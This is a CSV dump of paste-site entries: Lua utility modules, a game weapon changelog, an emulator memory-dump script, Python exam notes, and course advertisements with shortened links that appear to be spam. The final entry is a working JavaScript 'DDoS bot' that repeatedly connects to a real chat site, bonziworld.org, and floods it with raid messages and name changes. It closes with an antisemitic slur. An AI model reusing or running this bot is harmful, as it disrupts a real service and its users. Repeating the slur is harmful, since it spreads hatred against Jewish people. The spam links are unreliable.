id,title,username,language,date,content
ztdU7hVs,MaanOS/cc:tweaked - string,maanlamp,Lua,Saturday 20th of January 2024 06:03:30 PM CDT,"local String = {};

function String.isLetter (char)
	local code = char:sub(1, 1):byte();
	if (code >= 98 and code <= 122) then
		return true; -- a-z
	elseif (code >= 65 and code <= 90) then
		return true; -- A-Z
	end
	return false;
end;

function String.charAt(str, at)
	return str:sub(at, at);
end

return String;"
UViAHFXZ,Lizard Game,AlphaBanStorage,C#,Saturday 20th of January 2024 05:56:37 PM CDT,"Fitky_austin
Emblazes
Lizard
TheBeastMare"
t2xjBLx7,MaanOS/cc:tweaked - timer,maanlamp,Lua,Saturday 20th of January 2024 05:42:46 PM CDT,"local Event = require(""core.event"");

local Timer = {};

function Timer.duration(f, ms)
	local id = os.startTimer(ms / 1000);
	local function handler(event)
		if (event.args[1] == id) then
			f();
		end
	end
	Event.on(""timer"", handler, { once = true });
	local function clear()
		os.cancelTimer(id);
		Event.off(""timer"", handler);
	end
	return clear;
end

function Timer.periodic(f, ms)
	local id = os.startTimer(ms / 1000);
	local function handler(event)
		if (event.args[1] == id) then
			f();
			id = os.startTimer(ms / 1000);
		end
	end
	Event.on(""timer"", handler);
	local function clear()
		os.cancelTimer(id);
		Event.off(""timer"", handler);
	end
	return clear;
end

function Timer.schedule(f, atHour)
	local id = os.setAlarm(atHour);
	local function handler(event)
		if (event.args[1] == id) then
			f();
		end
	end
	Event.on(""alarm"", handler, { once = true });
	local function clear()
		os.cancelAlarm(id);
		Event.off(""alarm"", handler);
	end
	return clear;
end

return Timer;"
7PBewZVi,BWR - Changelog 20/01/24,SSilver,Diff,Saturday 20th of January 2024 05:41:21 PM CDT,"Detonator
+ Removed self-damage penalty
+ Removed afterburn penalty on splash
Scorch Shot
+ Removed afterburn penalty on splash
Afterburn against groups really wasn't as problematic as previously thought given the timing needed on the Detonator and the delay of the Scorch Shot. The Detonator especially was falling behind in movement potential with the airblast jumps Pyro has, so the self-damage nerf was removed to make the greater jumps this weapon has more desireable.

Iron Bomber
+ Reverted push force to grenade jumping
+ Removed damage penalty from rollers
- Added: -10% damage penalty
- Reverted self damage from grenades
The weapon didn't have serious enough downsides to it. The best that could be figured for a weapon that emphaizes greater roller strength was to give it a direct damage penalty instead. This way the launcher has a more defined niche in being worse against single healthier targets while better against groups crowded groups.

Chargin' Targe
+ Added -33% reduction in push force taken from damage
This shield felt a little left behind, being only really useful in tanking a lot of damage. This change should help the demoman close the gap when engaging in melee and charging in.

Scotsman's Skullcutter
+ Charging is unaffected by speed penalty
A fix to the weapon's speed erroneously impacting how far your charges went.

Syringe Gun
~ Below applies to all unlocks
+ Crit heal recovery increased to -5 seconds on hit (was -3s)
Feedback on syringes showed they could use some speeding up, so it was buffed to make the process smoother, especially when healing a larger group.

Amputator
+ Recreated on-hit effect to prevent it cancelling other healing beams
Fixing a strange behavior with the on-hit effect cancelling other healing sources once it was over, including Quick-Fix's Megaheal and the weapon's own Medicating Melody taunt. This version shouldn't override any extra healing but will be canceled by the healing taunt.

Bazaar Bargain
+ Removed damage penalty
+ Removed base charge rate penalty
- Added -50% charge damage penalty
The nerfing of this weapon made it seem exceptionally less useful even when the snowball was built up for the lowered pick potential without charging. This version gives it a flip to that, making it less useful against healthier targets but being easier to build up the snowball.

The Machina
+ Buildings should be affected by charge damage buff
- Added 25% slower charging speed
The increased charge damage appeared to need a proper counterbalance due to how quickly one could take out higher health targets, so slowing it's charge speed felt appropriate."
jLC1piLn,ganonfloor_dolphin.lua,exodus122,Lua,Saturday 20th of January 2024 05:32:52 PM CDT,"-- modified version of MrCheeze's lua script which was for bizhawk
-- this version is used with Dolphin 5.0-14344 and Cheat Engine lua engine
-- oot version 1.2

ramStart = readPointer(""Dolphin.exe+0xC4DC70"")+0xE74000

function to_signed_32(num) 
    if num > 2147483648 then
        num = num - (2 * 2147483648)
        return num
    else return num
    end
end

function to_signed_16(num) 
    if num > 32768 then
        num = num - (2 * 32768)
        return num
    else return num
    end
end

function read_u32_be(addr)
	val = readInteger(ramStart+addr)
	return ((val & 0xFF) << 24)
           | ((val & 0xFF00) << 8)
           | ((val >> 8) & 0xFF00)
           | ((val >> 24) & 0xFF);
end

function read_s32_be(addr)
	val = readInteger(ramStart+addr)
	newval = ((val & 0xFF) << 24)
           | ((val & 0xFF00) << 8)
           | ((val >> 8) & 0xFF00)
           | ((val >> 24) & 0xFF);
    return to_signed_32(newval)
end

function read_u16_be(addr)
    val = readSmallInteger(ramStart+addr)
	return ((val & 0xFF) << 8)
           | ((val >> 8) & 0xFF);
end

function read_s16_be(addr)
    val = readSmallInteger(ramStart+addr)
	newval = ((val & 0xFF) << 8)
           | ((val >> 8) & 0xFF);
	return to_signed_16(newval)
end

function readbyte(addr)
    return readBytes(ramStart+addr, 1)
end

addr_colCtx = 0x1C9520 -- NTSC 1.2
addr_exitList = 0x1DAB64 -- NTSC 1.2

exitList = read_u32_be(addr_exitList)

colCtx_colHeader = read_u32_be(addr_colCtx)
colCtx_lookupTbl = read_u32_be(addr_colCtx+0x40)
colCtx_polyNodes_tbl = read_u32_be(addr_colCtx+0x48)
colCtx_polyNodes_polyCheckTbl = read_u32_be(addr_colCtx+0x4C)
colCtx_dyna_polyList = read_u32_be(addr_colCtx+0x50+0x13F0)
colCtx_dyna_vtxList = read_u32_be(addr_colCtx+0x50+0x13F4)

colCtx_colHeader_vtxList = read_u32_be(colCtx_colHeader - 0x80000000 + 0x10)
colCtx_colHeader_polyList = read_u32_be(colCtx_colHeader - 0x80000000 + 0x18)
colCtx_colHeader_surfaceTypeList = read_u32_be(colCtx_colHeader - 0x80000000 + 0x1C)

lookup_entry_count = read_s32_be(addr_colCtx+0x1C)*read_s32_be(addr_colCtx+0x20)*read_s32_be(addr_colCtx+0x24)

already_dumped_node_indexes = {}

dyna_polyListMax = read_u32_be(addr_colCtx + 0x50 + 0x1408)
dyna_vtxListMax = read_u32_be(addr_colCtx + 0x50 + 0x140C)

dyna_polyCount = 0
dyna_vtxCount = 0

for i=0,49 do
	if (bAnd(read_u16_be(addr_colCtx + 0x50 + 0x138C + 2*i), 0x0001)) ~= 0 then
		-- bgActor #i is in use
		bgActor_colHeader = read_u32_be(addr_colCtx + 0x50 + 0x4 + 0x64*i + 4)
		
		bgActor_vtxCount = read_u16_be(bgActor_colHeader - 0x80000000 + 0xC)
		dyna_vtxCount = dyna_vtxCount + bgActor_vtxCount

		bgActor_polyCount = read_u16_be(bgActor_colHeader - 0x80000000 + 0x14)
		dyna_polyCount = dyna_polyCount + bgActor_polyCount
	end
end

print(string.format(""%08X colCtx_dyna_vtxList (used=%d/%d)"", colCtx_dyna_vtxList, dyna_vtxCount, dyna_vtxListMax))
if dyna_vtxCount>dyna_vtxListMax then
	vtx_overflow_start = colCtx_dyna_vtxList + 6*dyna_vtxListMax
	vtx_overflow_end = colCtx_dyna_vtxList + 6*dyna_vtxCount
	print(string.format(""!!! dyna vtxList overflow into %08X-%08X !!!"", vtx_overflow_start, vtx_overflow_end))
end
print(string.format(""%08X colCtx_dyna_polyList (used=%d/%d)"", colCtx_dyna_polyList, dyna_polyCount, dyna_polyListMax))
if dyna_polyCount>dyna_polyListMax then
	poly_overflow_start = colCtx_dyna_polyList + 0x10*dyna_polyListMax
	poly_overflow_end = colCtx_dyna_polyList + 0x10*dyna_polyCount
	print(string.format(""!!! dyna polyList overflow into %08X-%08X !!!"", poly_overflow_start, poly_overflow_end))
end
print(string.format(""%08X colCtx_polyNodes_polyCheckTbl"", colCtx_polyNodes_polyCheckTbl))
print(string.format(""%08X colCtx_polyNodes_tbl"", colCtx_polyNodes_tbl))
print(string.format(""%08X colCtx_lookupTbl"", colCtx_lookupTbl))
print(string.format(""%08X exitList"", exitList))
print(string.format(""%08X colCtx_colHeader_surfaceTypeList"", colCtx_colHeader_surfaceTypeList))
print(string.format(""%08X colCtx_colHeader_polyList"", colCtx_colHeader_polyList))
print(string.format(""%08X colCtx_colHeader_vtxList"", colCtx_colHeader_vtxList))
print(string.format(""%08X colCtx_colHeader"", colCtx_colHeader))

for i=0,lookup_entry_count-1 do
	for j=0,1 do -- include floors and walls, but not ceilings
		
		nodeIndex = read_u16_be(colCtx_lookupTbl - 0x80000000 + 6*i + 2*j)
		
		while nodeIndex ~= 0xFFFF and not already_dumped_node_indexes[nodeIndex] do
			polyId = read_u16_be(colCtx_polyNodes_tbl - 0x80000000 + 4*nodeIndex)
			polySurfaceTypeId = read_u16_be(colCtx_colHeader_polyList - 0x80000000 + 0x10*polyId)
			surfaceExitIndex = bAnd(readbyte(colCtx_colHeader_surfaceTypeList - 0x80000000 + 8*polySurfaceTypeId + 2), 0x1F)
			
			if (surfaceExitIndex ~= 0) then
			
				exitValue = read_u16_be(exitList - 0x80000000 + 2*(surfaceExitIndex-1))
			
				polyVertIdA = bAnd(read_u16_be(colCtx_colHeader_polyList - 0x80000000 + 0x10*polyId + 2), 0x1FFF)
				polyVertIdB = bAnd(read_u16_be(colCtx_colHeader_polyList - 0x80000000 + 0x10*polyId + 4), 0x1FFF)
				polyVertIdC = read_u16_be(colCtx_colHeader_polyList - 0x80000000 + 0x10*polyId + 6)
				
				vertAX = read_s16_be(colCtx_colHeader_vtxList - 0x80000000 + 6*polyVertIdA + 0)
				vertAY = read_s16_be(colCtx_colHeader_vtxList - 0x80000000 + 6*polyVertIdA + 2)
				vertAZ = read_s16_be(colCtx_colHeader_vtxList - 0x80000000 + 6*polyVertIdA + 4)
				vertBX = read_s16_be(colCtx_colHeader_vtxList - 0x80000000 + 6*polyVertIdB + 0)
				vertBY = read_s16_be(colCtx_colHeader_vtxList - 0x80000000 + 6*polyVertIdB + 2)
				vertBZ = read_s16_be(colCtx_colHeader_vtxList - 0x80000000 + 6*polyVertIdB + 4)
				vertCX = read_s16_be(colCtx_colHeader_vtxList - 0x80000000 + 6*polyVertIdC + 0)
				vertCY = read_s16_be(colCtx_colHeader_vtxList - 0x80000000 + 6*polyVertIdC + 2)
				vertCZ = read_s16_be(colCtx_colHeader_vtxList - 0x80000000 + 6*polyVertIdC + 4)
				
				print(string.format(""exit %04X - nodeIndex %04X polyId %04X surfaceType %04X - (%d,%d,%d), (%d,%d,%d), (%d,%d,%d)"", exitValue, nodeIndex, polyId, polySurfaceTypeId, vertAX,vertAY,vertAZ, vertBX,vertBY,vertBZ, vertCX,vertCY,vertCZ))
			end
			
			already_dumped_node_indexes[nodeIndex] = true
			
			nodeIndex = read_u16_be(colCtx_polyNodes_tbl - 0x80000000 + 4*nodeIndex + 2)
		end
	end
end"
X3Xr0L2d,SELF LEAK - BYPASS SNTE (Say No To Exploits) 2024,Sambrifou,Lua,Saturday 20th of January 2024 05:03:25 PM CDT,"if hook.GetTable()[""CanTool""][""SNTE_KILL_BOUNCY_BALL_EXPLOIT""] then 
    print(""<Warning!> SNTE is detected"") 
        else 
    print(""<Warning!> SNTE is not detected"") 
end"
Ha4r2pZk,webinar-python-exam-review-2023-01-20,jspill,Python,Saturday 20th of January 2024 04:59:16 PM CDT,"# Exam Review 2024 Jan 20

# Do those LABS
# Ch 2-14... all Labs!
# Ch 21-32 just ADDITIONAL LABS, but important practice!
# Prac Tests, Ch 33 and 34... more than the Pre

# Use Submit Mode and get them to 100%!!!
# PAY ATTENTION to the unit tests!
# ... then UNIT TEST more! Unit test, unit test, unit test!

# Comp 1: Basic syntax and knowledge: operators, data types, etc
# Comp 2: Control Flow
# Comp 3: Modules and Files

# Comp 1: Basic syntax and knowledge: operators, data types, etc
# Operators
# = # assigns
# == # asking a question? A condition
# +
# -
# *
# /
# % # modulo... whole number remainder... ""how many whole things didn't fit since the last even division?""
# // # floor division... the last even division
# <
# >
# <=
# >=
# += # x += 1 ... x = x + 1
# -=
# ** # compare to pow(), math.pow()
# !=
# # keyword
# in # if x in myList
# not # if not x in myList
# and
# or # any one True means the combo is True...limit OR to 2-3 conditions

# Data Types/Classes
# int
# floats
# bool # True, False
# str # """"
# list # [ ]
# dict # {key: value}
# tuple # ( ) immutable, Python see a,b,c as (a,b,c) --> return x,y --> return (x,y)
# set # { } no duplicates, unordered --> no index, no slicing, no sort, no reverse
# range # range()... container of consecutive numbers --> range(start, stop, step)
# file # open()... f.read(), f.readlines(), f.write()

# Comp 2
# Control Flow! The how and when of our programs
# IF statements... if, if/else, if/elif, if/elif/else, etc
# LOOPS
# WHILE - - an IF that repeats
# FOR - looping over a container, or known number of times... hence range()
# # Check out my For Loops webinar in The Gotchas
# for ___ in __someContainer__:
# for item in myList:
# for char in myStr:
# for key in myDict: # myDict[key]
# for n in range(5):
# for i in range(0, len(myList)): # myList[i]
# for i, item in enumerate(myList):

# FUNCTIONS
# defining/writing a function vs calling
# modular... a function has ONE job
# return statements
# parameters are special variables for holding stuff coming into the function
# parameters vs arguments
# pay attention to whether the function is asked to return or print()/output
#
# def someFunction(x, y):
#     return x // y
#
# if __name__ == ""__main__"": # is this script the one that's running now
#     # inside this block we're answering this specific question
#     input1 = int(input())
#     input2 = int(input())
#     myNum = someFunction(input1, input2)
#     print(myNum)

# See ""tasks"" in the last section of Ch 10, 11, 13, 14 for function writing practice
# CodingBat also has good function-based Python questions:
# https://codingbat.com/python

# BUILT-IN FUNCTIONS
# input()
# print()
# len()
# min()
# max()
# sum()
# pow()
# abs()
# round() # cousins math.floor() and math.ceil()
# enumerate()
# int()
# float()
# list()
# range()
# str()
# dict()
# tuple()
# chr()
# ord()
# open()
# sorted() # different from list.sort()
# reversed() # different from list.reverse()
# type() # print(type(myVar).__name__)
# help()
# dir()
# help(str)
# print(dir(str))
# help(str.isspace)

# STRINGS
# be able to refer to indices, and slice
# mySlice[start:stop:step]
# myStr = ""abcd""
# revStr = myStr[::-1]
# print(revStr)

# KNOW YOUR WHITESPACE
# "" "" # space from spacebar
# # a lot of Unicode spaces
# '\n' # new line return
# ""\t"" # tab
# ""\r"" # carriage return

# STRING METHODS
# myStr.format() # ""Stuff I want to put together in this string like {:.2f}"".format(myVar)
# myStr.strip() # input().strip()
# myStr.split() # returns a list of smaller strings
# "","".join(listOfStrings)
# myStr.replace(subStr, newStr) # remove myStr = myStr.replace(subStr, """")
# myStr.index(subStr), myStr.find(subStr) # return index where found
# myStr.count(subStr) # return number of occurrences
# case: myStr.lower(), myStr.upper(), myStr.capitalize(), myStr.title()
# is/Boolean: myStr.islower(), myStr.isspace(), myStr.isalpha(), myStr.isdigit(), myStr.isnumeric(), myStr.isalnum()
# myStr.startswith(subStr), myStr.endswith(subStr)

# LISTS
# be able to refer by index and to slice
# LIST METHODS
# +
# myList.append(item)
# myList.insert(i, item)
# myList.extend(anotherList)
# -
# myList.pop(i)
# myList.remove(item) # pop() by index, remove() by value
# myList.clear()
# # other
# myList.sort()
# myList.reverse()
# myList.count(item)
# myList.index(item)

# DICT
# # use the key like an index []... then you don't really need DICT methods
# myDict[key] # get the value for that key --> similar to myDict.get()
# myDict[key] = value # assigns new value to key --> similar to myDict.update({k:v})
# DICT METHODS
# myDict.keys()
# myDict.values()
# if ""this"" in myDict: # membership check on a dict looks at keys
# if ""that"" in myDict.values():
# myDict.items() # for k, v in myDict.items()

# MODULES
# math and csv

# MATH MODULE
# import math # ""full import""
# math.factorial(x)
# math.ceil(x)
# math.floor(x)
# math.sqrt(x)
# math.pow(x, y)
# math.fabs(x)
# math.pi
# math.e

# PARTIAL IMPORT
# from math import sqrt # --> sqrt()
# from math import floor, ceil --> floor(), ceil()
# from math import * # floor(), sqrt()

# ALIAS IMPORT
# import math as m # --> m.floor(), m.factorial()

# FILES
# modes: r, w, a

# READ MODE
# with open(""test.txt"", ""r"") as f:
#     # f.read() # returns whole file as one big string
#     # f.readlines() # returns a list of strings, line by line
#     # f.write() # take one str arg and write into file (can't do here bc I'm in read mode)
#     contents = f.readlines()

# for line in contents:
#     line = line.strip()
#     print(line) # print(line, end=""\n"")
# print(contents)

# CSV Module
import csv # csv.reader()
with open(""mock_data.csv"", ""r"") as f1: # mockaroo.com
    contents = list(csv.reader(f1)) # csv.reader(f1, delimiter=""\t"") if a tsv
# print(contents[0:20])

# WRITE MODE
# let's write out a file with just rows where the last name started with H
# with open(""output_data32.csv"", 'w') as f2:
#     for row in contents:
#         # last name is position 2... row[2]
#         # lastName = row[2]
#         if row[2].startswith(""H"") or row[2].startswith(""h""):
#         # if row[2].lower().startswith(""h""):
#         # if row[2][0].lower() == ""h"":
#             f2.write("","".join(row) + ""\n"")

# APPEND MODE
# with open(""append_to_this.txt"", ""r"") as f3:
#     print(f3.readlines())

# ['Frodo\n', 'Sam\n', 'Merry'] # no final line return in this file tells me how to end my file's last line
with open(""append_to_this.txt"", ""a"") as f3:
    f3.write(""\nPippin"")


"
WGJTY3ni,Untitled,f0f077,MySQL,Saturday 20th of January 2024 04:57:31 PM CDT,"[NEW] Spring Boot 3, Spring 6 & Hibernate for Beginners
Spring Boot 3: Learn Spring 6, Spring Core, Spring REST, Spring MVC, Spring Security, Thymeleaf, JPA, Hibernate, MySQL
LEARN these HOT TOPICS in Spring Boot 3 and Spring 6:

Spring Boot 3

Spring Framework 6

Spring Boot 3 Core

Spring Boot 3 Annotations

Spring Boot 3 Java Configuration (all Java, no xml)

Spring Boot 3 and Spring MVC

Spring Boot 3 Hibernate/JPA CRUD

Spring Boot 3 Security

Spring Boot 3 REST API

Maven
for more:https://linkjust.com/cYp7yx0igMfWoRSSY0xWOxRPxx7tf
"
ipy21dWs,Untitled,f0f077,Java,Saturday 20th of January 2024 04:52:10 PM CDT,"Java and Spring Framework 6 with Spring Boot 3
Master Java, Spring 6 and Spring Boot 3 with JDBC, JPA, Maven, Docker and Microservices
Core Java
Spring Boot
Spring Core - IoC
Spring MVC
Spring AOP
Spring Data JPA
Spring REST
Spring Security
Docker
Top companies offer this course to their employees
for more:https://dz-linkk.com/AonbaR"
0hViixxS,Untitled,f0f077,Java,Saturday 20th of January 2024 04:48:23 PM CDT,"Java from Zero to First Job, Practical Guide, 2000+ examples
Java Core, TDD, Streams, Lambdas, JPA/Hibernate, SQL, Build Tools, Git, Web Servers, HTML,Servlets, JSP, Spring Boot etc
Learn the Java basics, including syntax and primitive data types
Get necessary knowledge to demonstrate your skills of Java to future employers
Students will learn programming basics which will help them to understand any other programming language
Interview practice tests
In this course you will get knowledge which is
for more:https://dz-linkk.com/28uo1"
Lnajixqx,Chuchel DDOS Bot,KwekFantic,JavaScript,Saturday 20th of January 2024 04:33:14 PM CDT,"{
    setInterval(() => {
        const socket = io(""https://bonziworld.org/"");
        socket.emit(""client"", ""MAIN"");
        socket.emit(""login"", {
            passcode: """",
            name: ""Chuchel DDoS bot"",
            room: ""default"",
        });
        socket.emit(""command"", {
            list: [""color"", ""https://cdn.discordapp.com/attachments/1132221617934717074/1197938507927261264/image.png?ex=65bd162c&is=65aaa12c&hm=3e75b2d4488c3baeaa6f53016a6593a77265303f6085a1ca0af003e1d6445ba4&""]
        })
        setTimeout(()=>{
            javascript:setInterval(function(){socket.emit('talk', {text:""THIS SERVER HAS BEEN RAIDED BY CHUCHEL DDOS BOT "" + Math.random() * 720})});
            javascript: setInterval(function(){socket.emit('command',{list:[""name"",""Chuchel DDoS bot "" + Math.random() * 720]})}, 40);
            socket.on('talk',function(data){v = ""I HATE BFDI SO MUCH! ""+ Math.random() * 1000000;
            socket.emit(""quote"",{msg:v.toString(),guid:data.guid});});
        }, 2500);
    },3000)
}
// only for hacker jews who love to hack this website for free
// don't try this at risk"
